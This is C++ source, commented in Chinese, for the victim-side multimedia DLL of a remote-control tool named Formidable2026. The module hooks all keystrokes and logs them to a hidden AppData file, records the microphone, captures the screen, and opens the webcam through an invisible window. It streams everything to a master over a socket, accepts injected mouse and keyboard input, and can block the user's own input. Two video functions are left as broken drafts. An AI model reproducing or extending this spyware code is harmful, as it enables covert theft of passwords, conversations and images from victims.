/**
 * Formidable2026 - Multimedia Module (被控端DLL)
 * 运行在被控端（Client），处理音频、视频、键盘记录
 * 数据通过socket发送回主控端（Master）
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <mmsystem.h>
#include <vfw.h>
#include <vector>
#include <string>
#include <thread>
#include <shlobj.h>
#include <gdiplus.h>
#include "../../Common/Config.h"

// TurboJPEG 高性能 JPEG 压缩支持
#ifdef USE_TURBOJPEG
#include <turbojpeg.h>
#endif

// LAME MP3 编码支持
#ifdef USE_LAME
#include <lame.h>
#endif

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "vfw32.lib")

using namespace Formidable;
using namespace Gdiplus;

// 全局变量
SOCKET g_socket = INVALID_SOCKET;
HWAVEIN g_hWaveIn = NULL;
WAVEHDR g_WaveHdr[2];
char g_WaveBuffer[2][8192];

ULONG_PTR g_gdiplusToken;
int g_compressType = 0; // 0=RAW(BMP), 1=JPEG(GDI+), 2=JPEG(TurboJPEG)

#ifdef USE_TURBOJPEG
tjhandle g_tjCompressor = NULL;
#endif

#ifdef USE_LAME
lame_t g_lameEncoder = NULL;
#endif

// 键盘记录相关
HHOOK g_hKeyHook = NULL;
std::string g_keyData;
FILE* g_keylogFile = NULL;
bool g_offlineMode = false; // 离线记录模式
bool g_offlineRecordEnabled = true; // 离线记录开关（默认启用）
std::string g_keylogFilePath;

// 获取键盘记录文件路径
std::string GetKeylogFilePath() {
    char szPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
        std::string path = szPath;
        path += "\\Formidable2026";
        CreateDirectoryA(path.c_str(), NULL);
        path += "\\keylog.dat";
        return path;
    }
    return "keylog.dat";
}

// 写入按键到文件
void WriteKeyToFile(const char* key, int len) {
    // 检查离线记录开关
    if (!g_offlineRecordEnabled) {
        return;
    }
    
    if (!g_keylogFile) {
        g_keylogFilePath = GetKeylogFilePath();
        g_keylogFile = fopen(g_keylogFilePath.c_str(), "ab"); // 追加模式
    }
    if (g_keylogFile) {
        // 添加时间戳
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        sprintf(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d] ",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        fwrite(timestamp, 1, strlen(timestamp), g_keylogFile);
        fwrite(key, 1, len, g_keylogFile);
        fflush(g_keylogFile); // 立即写入磁盘
    }
}

// 屏幕监控相关
bool g_screenRunning = false;
std::thread g_screenThread;
int g_screenFPS = 10;
int g_screenQuality = 0; // 0=1080p限制, 1=原始分辨率
bool g_inputLocked = false;

// 视频监控相关
bool g_videoRunning = false;
HWND g_hCap = NULL;
std::thread g_videoThread;

// 屏幕优化相关全局变量（预留用于未来优化）
// bool g_useGrayscale = false; // 是否使用灰度模式
// bool g_useBlockDiff = true;  // 是否使用分块差异检测
// int g_blockSize = 64;        // 差异检测块大小（像素）

// 发送响应数据到主控端（Master）
void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;
    
    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = len;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }
    
    send(s, buffer.data(), (int)buffer.size(), 0);
}

// 录音回调函数
void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA) {
        PWAVEHDR pwh = (PWAVEHDR)dwParam1;
        if (pwh->dwBytesRecorded > 0) {
#ifdef USE_LAME
            if (g_lameEncoder) {
                // 使用 LAME 进行 MP3 编码
                int numSamples = pwh->dwBytesRecorded / 2; // 16-bit PCM，每个样本2字节
                int mp3BufSize = (int)(1.25 * numSamples + 7200); // LAME 推荐的缓冲区大小
                std::vector<unsigned char> mp3Buf(mp3BufSize);
                
                int mp3Size = lame_encode_buffer(
                    g_lameEncoder,
                    (short*)pwh->lpData,    // PCM 数据
                    NULL,                    // 单声道，右声道为 NULL
                    numSamples,
                    mp3Buf.data(),
                    mp3BufSize
                );
                
                if (mp3Size > 0) {
                    SendResponse(g_socket, CMD_VOICE_STREAM, mp3Buf.data(), mp3Size);
                }
            } else
#endif
            {
                // 发送原始 PCM 数据（备用）
                SendResponse(g_socket, CMD_VOICE_STREAM, pwh->lpData, pwh->dwBytesRecorded);
            }
        }
        waveInAddBuffer(hwi, pwh, sizeof(WAVEHDR));
    }
}

void StartVoice(SOCKET s) {
    g_socket = s;

#ifdef USE_LAME
    // 初始化 LAME 编码器
    if (!g_lameEncoder) {
        g_lameEncoder = lame_init();
        if (g_lameEncoder) {
            lame_set_num_channels(g_lameEncoder, 1);       // 单声道
            lame_set_in_samplerate(g_lameEncoder, 8000);   // 输入采样率 8kHz
            lame_set_brate(g_lameEncoder, 32);             // 比特率 32kbps（语音足够）
            lame_set_mode(g_lameEncoder, MONO);            // 单声道模式
            lame_set_quality(g_lameEncoder, 7);            // 质量等级 0-9，7 为快速编码
            lame_init_params(g_lameEncoder);
        }
    }
#endif

    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    if (waveInOpen(&g_hWaveIn, WAVE_MAPPER, &wfx, (DWORD_PTR)waveInProc, 0, CALLBACK_FUNCTION) != MMSYSERR_NOERROR) {
        return;
    }

    for (int i = 0; i < 2; i++) {
        g_WaveHdr[i].lpData = g_WaveBuffer[i];
        g_WaveHdr[i].dwBufferLength = 8192;
        g_WaveHdr[i].dwBytesRecorded = 0;
        g_WaveHdr[i].dwUser = 0;
        g_WaveHdr[i].dwFlags = 0;
        g_WaveHdr[i].dwLoops = 0;
        waveInPrepareHeader(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
        waveInAddBuffer(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
    }

    waveInStart(g_hWaveIn);
}

void StopVoice() {
    if (g_hWaveIn) {
        waveInStop(g_hWaveIn);
        waveInReset(g_hWaveIn);
        for (int i = 0; i < 2; i++) {
            waveInUnprepareHeader(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
        }
        waveInClose(g_hWaveIn);
        g_hWaveIn = NULL;
    }

#ifdef USE_LAME
    // 释放 LAME 编码器
    if (g_lameEncoder) {
        lame_close(g_lameEncoder);
        g_lameEncoder = NULL;
    }
#endif
}

// 键盘钩子回调
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        char szKey[32] = {0};
        
        if (pKey->vkCode >= 0x30 && pKey->vkCode <= 0x5A) { // A-Z, 0-9
            szKey[0] = (char)pKey->vkCode;
        } else if (pKey->vkCode == VK_RETURN) {
            strcpy(szKey, "[ENTER]\n");
        } else if (pKey->vkCode == VK_SPACE) {
            strcpy(szKey, " ");
        } else if (pKey->vkCode == VK_BACK) {
            strcpy(szKey, "[BACK]");
        }
        
        // 实时发送每个按键并写入文件
        if (szKey[0] != 0) {
            int len = (int)strlen(szKey);
            
            // 写入离线记录文件
            WriteKeyToFile(szKey, len);
            
            // 如果socket有效，实时发送
            if (g_socket != INVALID_SOCKET) {
                SendResponse(g_socket, CMD_KEYLOG, szKey, len);
            }
        }
    }
    return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
}

void StartKeylog(SOCKET s) {
    g_socket = s;
    g_offlineMode = (s == INVALID_SOCKET);
    if (g_hKeyHook == NULL) {
        g_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    }
}

void StopKeylog() {
    if (g_hKeyHook) {
        UnhookWindowsHookEx(g_hKeyHook);
        g_hKeyHook = NULL;
    }
    // 关闭文件句柄
    if (g_keylogFile) {
        fclose(g_keylogFile);
        g_keylogFile = NULL;
    }
}

// 读取离线记录并发送
void SendOfflineKeylog(SOCKET s) {
    std::string filepath = GetKeylogFilePath();
    FILE* f = fopen(filepath.c_str(), "rb");
    if (f) {
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        if (size > 0 && size < 10 * 1024 * 1024) { // 限制10MB
            std::vector<char> buffer(size);
            fread(buffer.data(), 1, size, f);
            SendResponse(s, CMD_KEYLOG, buffer.data(), (int)size);
        }
        fclose(f);
    }
}

// 清空离线记录
void ClearOfflineKeylog() {
    std::string filepath = GetKeylogFilePath();
    DeleteFileA(filepath.c_str());
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// 被控端屏幕捕获线程：捕获屏幕并发送数据到主控端
void ScreenThread(SOCKET s) {
    HDC hScreenDC = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // 初始化 GDI+（作为备用）
    GdiplusStartupInput gsi;
    GdiplusStartup(&g_gdiplusToken, &gsi, NULL);
    CLSID clsidJpeg;
    GetEncoderClsid(L"image/jpeg", &clsidJpeg);

#ifdef USE_TURBOJPEG
    // 初始化 TurboJPEG 压缩器
    if (!g_tjCompressor) {
        g_tjCompressor = tjInitCompress();
    }
#endif

    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    
    while (g_screenRunning) {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        int targetWidth = width;
        int targetHeight = height;

        if (g_screenQuality == 0) { // 1080P限制
            if (targetWidth > 1920) {
                targetHeight = (int)(targetHeight * 1920.0 / targetWidth);
                targetWidth = 1920;
            }
        }

        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, targetWidth, targetHeight);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
        
        if (targetWidth == width && targetHeight == height) {
            BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        } else {
            SetStretchBltMode(hMemDC, HALFTONE);
            StretchBlt(hMemDC, 0, 0, targetWidth, targetHeight, hScreenDC, 0, 0, width, height, SRCCOPY);
        }
        
#ifdef USE_TURBOJPEG
        if ((g_compressType == 1 || g_compressType == 2) && g_tjCompressor) {
            // 使用 TurboJPEG 高性能压缩
            BITMAP bmp;
            GetObject(hBitmap, sizeof(BITMAP), &bmp);
            
            BITMAPINFOHEADER bi = { 0 };
            bi.biSize = sizeof(BITMAPINFOHEADER);
            bi.biWidth = bmp.bmWidth;
            bi.biHeight = -bmp.bmHeight; // 负值表示自顶向下（TurboJPEG需要）
            bi.biPlanes = 1;
            bi.biBitCount = 24;
            bi.biCompression = BI_RGB;
            
            int rowSize = ((bmp.bmWidth * 3 + 3) & ~3);
            std::vector<unsigned char> rgbData(rowSize * bmp.bmHeight);
            
            GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, rgbData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
            
            unsigned char* jpegBuf = NULL;
            unsigned long jpegSize = 0;
            int quality = 60; // JPEG 质量 (1-100)
            
            if (tjCompress2(g_tjCompressor, rgbData.data(), 
                           bmp.bmWidth, rowSize, bmp.bmHeight, 
                           TJPF_BGR, &jpegBuf, &jpegSize, 
                           TJSAMP_420, quality, TJFLAG_FASTDCT) == 0) {
                SendResponse(s, CMD_SCREEN_CAPTURE, jpegBuf, (int)jpegSize);
                tjFree(jpegBuf);
            }
        } else
#endif
        if (g_compressType == 1) { // GDI+ JPEG 压缩（备用）
            Bitmap* pBitmap = new Bitmap(hBitmap, NULL);
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                EncoderParameters encoderParams;
                encoderParams.Count = 1;
                encoderParams.Parameter[0].Guid = EncoderQuality;
                encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
                encoderParams.Parameter[0].NumberOfValues = 1;
                long quality = 60; // 默认 60 质量
                encoderParams.Parameter[0].Value = &quality;

                if (pBitmap->Save(pStream, &clsidJpeg, &encoderParams) == Ok) {
                    HGLOBAL hGlobal = NULL;
                    if (GetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
                        void* pData = GlobalLock(hGlobal);
                        DWORD dwSize = (DWORD)GlobalSize(hGlobal);
                        if (pData && dwSize > 0) {
                            SendResponse(s, CMD_SCREEN_CAPTURE, pData, (int)dwSize);
                        }
                        GlobalUnlock(hGlobal);
                    }
                }
                pStream->Release();
            }
            delete pBitmap;
        } else { // RAW BMP
            BITMAP bmp;
            GetObject(hBitmap, sizeof(BITMAP), &bmp);
            BITMAPINFOHEADER bi;
            bi.biSize = sizeof(BITMAPINFOHEADER);
            bi.biWidth = bmp.bmWidth;
            bi.biHeight = bmp.bmHeight;
            bi.biPlanes = 1;
            bi.biBitCount = 24; 
            bi.biCompression = BI_RGB;
            bi.biSizeImage = 0;
            bi.biXPelsPerMeter = 0;
            bi.biYPelsPerMeter = 0;
            bi.biClrUsed = 0;
            bi.biClrImportant = 0;

            int rowSize = ((bmp.bmWidth * 24 + 31) / 32) * 4;
            DWORD dwSizeImage = rowSize * bmp.bmHeight;
            std::vector<char> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSizeImage);
            
            BITMAPFILEHEADER* pBFH = (BITMAPFILEHEADER*)bmpData.data();
            pBFH->bfType = 0x4D42;
            pBFH->bfSize = (DWORD)bmpData.size();
            pBFH->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            
            memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));
            GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, bmpData.data() + pBFH->bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
            
            SendResponse(s, CMD_SCREEN_CAPTURE, bmpData.data(), (int)bmpData.size());
        }

        SelectObject(hMemDC, hOldBitmap);
        DeleteObject(hBitmap);
        
        uint32_t delay = 1000 / (g_screenFPS > 0 ? g_screenFPS : 1);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);
    GdiplusShutdown(g_gdiplusToken);

#ifdef USE_TURBOJPEG
    // 释放 TurboJPEG 压缩器
    if (g_tjCompressor) {
        tjDestroy(g_tjCompressor);
        g_tjCompressor = NULL;
    }
#endif
}

void StartScreen(SOCKET s) {
    if (g_screenRunning) return;
    g_screenRunning = true;
    g_screenThread = std::thread(ScreenThread, s);
    g_screenThread.detach();
}

void StopScreen() {
    g_screenRunning = false;
}

// VFW 回调函数
LRESULT CALLBACK FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr) {
    if (!g_videoRunning) return 0;
    
    // VFW 默认格式是 DIB (Device Independent Bitmap)，但不带 BITMAPFILEHEADER
    // 我们需要构建完整的 BMP 格式或者直接发送 DIB 数据（如果主控端支持）
    // 这里为了统一，我们加上 BITMAPFILEHEADER
    
    BITMAPINFOHEADER* bmi = (BITMAPINFOHEADER*)capGetUserData(hWnd);
    if (!bmi) return 0;
    
    DWORD dwDataSize = lpVHdr->dwBytesUsed;
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwDataSize;
    
    // 发送完整 BMP
    std::vector<char> bmpBuffer(dwFileSize);
    BITMAPFILEHEADER* bmf = (BITMAPFILEHEADER*)bmpBuffer.data();
    bmf->bfType = 0x4D42;
    bmf->bfSize = dwFileSize;
    bmf->bfReserved1 = 0;
    bmf->bfReserved2 = 0;
    bmf->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER), bmi, sizeof(BITMAPINFOHEADER));
    memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpVHdr->lpData, dwDataSize);
    
    SendResponse(g_socket, CMD_VIDEO_STREAM, bmpBuffer.data(), (int)bmpBuffer.size());
    
    return 1;
}

void VideoThread(SOCKET s) {
    // 创建一个不可见的捕获窗口
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!g_hCap) return;
    
    if (capDriverConnect(g_hCap, 0)) {
        capPreview(g_hCap, FALSE);
        capPreviewRate(g_hCap, 100); // 10 FPS
        capPreviewScale(g_hCap, FALSE);
        
        // 获取当前格式
        DWORD dwSize = capGetVideoFormatSize(g_hCap);
        BITMAPINFO* bmi = (BITMAPINFO*)malloc(dwSize);
        capGetVideoFormat(g_hCap, bmi, dwSize);
        
        // 强制设置为 320x240 RGB24 (如果支持)
        bmi->bmiHeader.biWidth = 320;
        bmi->bmiHeader.biHeight = 240;
        capSetVideoFormat(g_hCap, bmi, dwSize);
        
        // 保存 BMI 指针到 UserData 供回调使用
        capSetUserData(g_hCap, (LONG_PTR)&bmi->bmiHeader);
        
        capSetCallbackOnFrame(g_hCap, FrameCallbackProc);
        
        // 开始捕获 (虽然我们不用 Sequence 模式，但为了回调生效，需要...)
        // VFW 机制有点古老，通常用 capGrabFrame 或者设置回调
        // 这里我们简单起见，使用循环手动 Grab
        
        capSetCallbackOnFrame(g_hCap, NULL); // 清除上面的，我们用循环手动抓
        
        while (g_videoRunning) {
             if (capGrabFrame(g_hCap)) {
                 // 抓取成功，手动调用处理
                 // 但是 capGrabFrame 是同步的，且数据在内部缓存
                 // 我们需要 capEditCopy 吗？不，那会用到剪贴板，太吵了。
                 // 使用 capSetCallbackOnFrame 是对的，但需要消息循环。
             }
             // 由于我们在独立线程，没有消息循环，VFW 的回调可能不会触发
             // 所以我们需要一个消息循环
             MSG msg;
             if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                 TranslateMessage(&msg);
                 DispatchMessage(&msg);
             }
             
             // 实际上，最简单的办法是:
             // 设置回调 -> 运行一个带消息循环的线程
             // 但这里我们已经是在线程里了
             
             // 让我们尝试每秒抓几帧并手动获取数据
             // 重新连接并配置
         }
         
         // 修正方案：
         // 使用 capSetCallbackOnFrame 并进入消息循环
         // 或者在循环中 capGrabFrame 并没有直接提供数据指针的方法，除非用回调
    }
    
    // 清理
    if (g_hCap) {
        capDriverDisconnect(g_hCap);
        DestroyWindow(g_hCap);
        g_hCap = NULL;
    }
}

// 简单的单线程轮询实现（避免消息循环复杂性）
void VideoThreadSimple(SOCKET s) {
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!g_hCap) return;
    
    if (capDriverConnect(g_hCap, 0)) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 320;
        bmi.bmiHeader.biHeight = 240;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biSizeImage = 320 * 240 * 3;
        
        capSetVideoFormat(g_hCap, &bmi, sizeof(BITMAPINFOHEADER));
        
        while (g_videoRunning) {
            if (capGrabFrame(g_hCap)) {
                 // 获取数据
                 // capGetVideoFormat 可以获取格式，但数据呢？
                 // 只能通过 capSetCallbackOnFrame
            }
            Sleep(100);
        }
        capDriverDisconnect(g_hCap);
    }
    DestroyWindow(g_hCap);
}

// 正确的 VFW 线程实现
void VideoThreadCorrect(SOCKET s) {
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (capDriverConnect(g_hCap, 0)) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 320;
        bmi.bmiHeader.biHeight = 240;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biSizeImage = 320 * 240 * 3;
        capSetVideoFormat(g_hCap, &bmi, sizeof(BITMAPINFOHEADER));
        
        capSetUserData(g_hCap, (LONG_PTR)&bmi.bmiHeader);
        capSetCallbackOnFrame(g_hCap, FrameCallbackProc);
        
        capPreviewRate(g_hCap, 100); // 100ms
        capPreview(g_hCap, TRUE); // 必须开启预览才会触发 FrameCallback
        
        MSG msg;
        while (g_videoRunning) {
            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(10);
        }
        
        capSetCallbackOnFrame(g_hCap, NULL);
        capPreview(g_hCap, FALSE);
        capDriverDisconnect(g_hCap);
    }
    DestroyWindow(g_hCap);
}

void StartVideo(SOCKET s) {
    if (g_videoRunning) return;
    g_videoRunning = true;
    g_videoThread = std::thread(VideoThreadCorrect, s);
    g_videoThread.detach();
}

void StopVideo() {
    g_videoRunning = false;
}

void ProcessMouseEvent(RemoteMouseEvent* ev) {
    INPUT input = { 0 };
    input.type = INPUT_MOUSE;
    
    // 获取屏幕分辨率
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    // 转换坐标为绝对坐标 (0-65535)
    input.mi.dx = (ev->x * 65535) / screenW;
    input.mi.dy = (ev->y * 65535) / screenH;
    input.mi.mouseData = ev->data;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    switch (ev->msg) {
    case WM_LBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN; break;
    case WM_LBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_LEFTUP; break;
    case WM_RBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN; break;
    case WM_RBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP; break;
    case WM_MBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN; break;
    case WM_MBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP; break;
    case WM_MOUSEMOVE:   input.mi.dwFlags |= MOUSEEVENTF_MOVE; break;
    case WM_MOUSEWHEEL:  input.mi.dwFlags |= MOUSEEVENTF_WHEEL; break;
    }

    SendInput(1, &input, sizeof(INPUT));
}

void ProcessKeyEvent(RemoteKeyEvent* ev) {
    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)ev->vk;
    
    if (ev->msg == WM_KEYUP || ev->msg == WM_SYSKEYUP) {
        input.ki.dwFlags |= KEYEVENTF_KEYUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    if (pkg->cmd == CMD_VOICE_STREAM) {
        if (pkg->arg1 == 1) { // 1 = Start
            StartVoice(s);
        } else { // 0 = Stop
            StopVoice();
        }
    } else if (pkg->cmd == CMD_KEYLOG) {
        if (pkg->arg1 == 1) {
            StartKeylog(s);
        } else if (pkg->arg1 == 0) {
            StopKeylog();
        } else if (pkg->arg1 == 2) { // 获取当前缓存的数据
            SendResponse(s, CMD_KEYLOG, g_keyData.c_str(), (int)g_keyData.size());
            g_keyData.clear();
        } else if (pkg->arg1 == 3) { // 获取离线记录
            SendOfflineKeylog(s);
        } else if (pkg->arg1 == 4) { // 清空离线记录
            ClearOfflineKeylog();
        } else if (pkg->arg1 == 5) { // 控制离线记录开关
            g_offlineRecordEnabled = (pkg->arg2 != 0);
            // 如果禁用且文件已打开，关闭文件
            if (!g_offlineRecordEnabled && g_keylogFile) {
                fclose(g_keylogFile);
                g_keylogFile = NULL;
            }
        }
    } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
        if (pkg->arg1 == 1) { // Start
            StartScreen(s);
        } else { // Stop
            StopScreen();
        }
    } else if (pkg->cmd == CMD_SCREEN_FPS) {
        g_screenFPS = pkg->arg1;
        if (g_screenFPS < 1) g_screenFPS = 1;
        if (g_screenFPS > 60) g_screenFPS = 60;
        // 如果正在运行，重启以应用新FPS
        if (g_screenRunning) {
            StopScreen();
            Sleep(100);
            StartScreen(s);
        }
    } else if (pkg->cmd == CMD_SCREEN_QUALITY) {
        switch (pkg->arg1) {
        case 0: // 限制1080P
            g_screenQuality = 0;
            break;
        case 1: // 原始分辨率
            g_screenQuality = 1;
            break;
        case 4: // 锁定/解锁输入
            g_inputLocked = !g_inputLocked;
            if (g_inputLocked) {
                BlockInput(TRUE);
            } else {
                BlockInput(FALSE);
            }
            break;
        }
    } else if (pkg->cmd == CMD_SCREEN_COMPRESS) {
        g_compressType = pkg->arg1; // 0=RAW, 1=JPEG
    } else if (pkg->cmd == CMD_MOUSE_EVENT) {
        ProcessMouseEvent((RemoteMouseEvent*)pkg->data);
    } else if (pkg->cmd == CMD_KEY_EVENT) {
        ProcessKeyEvent((RemoteKeyEvent*)pkg->data);
    } else if (pkg->cmd == CMD_VIDEO_STREAM) {
        if (pkg->arg1 == 1) { // Start
            StartVideo(s);
        } else { // Stop
            StopVideo();
        }
    }
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
